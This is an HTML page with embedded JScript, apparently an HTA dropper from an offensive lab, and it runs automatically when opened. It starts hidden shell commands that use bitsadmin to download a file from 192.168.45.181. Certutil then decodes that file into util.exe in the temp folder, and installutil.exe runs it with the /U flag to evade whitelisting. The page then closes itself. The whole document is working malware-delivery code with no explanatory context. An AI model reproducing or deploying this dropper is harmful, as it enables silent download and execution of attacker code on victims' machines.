<html>
<head>
<script language="JScript">
function downloadFile() {
    var strUrl = "http://192.168.45.181:80/util.txt";
    var strFilePath = "%temp%\\util.txt";
    var strDecodedFilePath = "%temp%\\util.exe";

    var objShell = new ActiveXObject("WScript.Shell");

    var strBITSAdminCmd = "bitsadmin /transfer myJob " + strUrl + " " + strFilePath;
    objShell.Run(strBITSAdminCmd, 0, true);

    var strCertUtilCmd = "certutil -decode " + strFilePath + " " + strDecodedFilePath;
    objShell.Run(strCertUtilCmd, 0, true);

    var strInstallUtilCmd = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U " + strDecodedFilePath;
    objShell.Run(strInstallUtilCmd, 0, true);
}

downloadFile();
self.close();
</script>
</head>
<body>
</body>
</html>
